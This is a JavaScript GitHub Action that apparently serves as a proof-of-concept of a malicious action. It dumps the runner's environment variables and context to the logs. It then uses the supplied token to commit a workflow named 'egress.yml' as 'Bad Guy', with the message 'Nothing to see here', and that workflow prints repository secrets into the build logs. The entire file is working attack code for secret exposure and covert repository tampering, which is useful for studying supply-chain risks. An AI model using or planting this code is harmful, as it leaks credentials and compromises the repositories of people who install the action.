const core = require("@actions/core");
const github = require("@actions/github");
const https = require("https");

const workflow = `
name: "ruh-roh"
on:
  push:

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v2
    - run: |
      echo "test token: '\${{ secrets.GITHUB_TOKEN }}'"
    - run: |
      echo "test secret: '\${{ secrets.TEST_SECRET }}'"
`;

async function run() {
  const token = core.getInput("token");
  console.log(`Got token: ${token.slice(0, 10)}...`);
  // const env = core.getInput("env");
  // console.log(`Got env: ${env}`);
  console.log("github context:");
  console.log(github.context);

  console.log("process env:");
  console.log(process.env);

  const octokit = github.getOctokit(token);
  const name = "Bad Guy";
  const email = "badguy@example.local";
  const owner = github.context.payload.repository.owner.login;
  const repo = github.context.payload.repository.name;
  console.log(`pushing to ${owner}/${repo}`);
  try {
    const { data } = await octokit.rest.repos.createOrUpdateFileContents({
      owner,
      repo,
      path: ".github/workflows/egress.yml",
      message: "Nothing to see here",
      content: workflow,
      committer_name: name,
      committer_email: email,
      author_name: name,
      author_email: email,
    });
    console.log(data);
  } catch (e) {
    console.log(e);
    core.setFailed(e.message);
    return;
  }

  try {
    const { data, headers } = await octokit.request("/");
    console.log(data);
    console.log(headers);
  } catch (e) {
    console.log(e);
    core.setFailed(e.message);
    return;
  }
}

run();
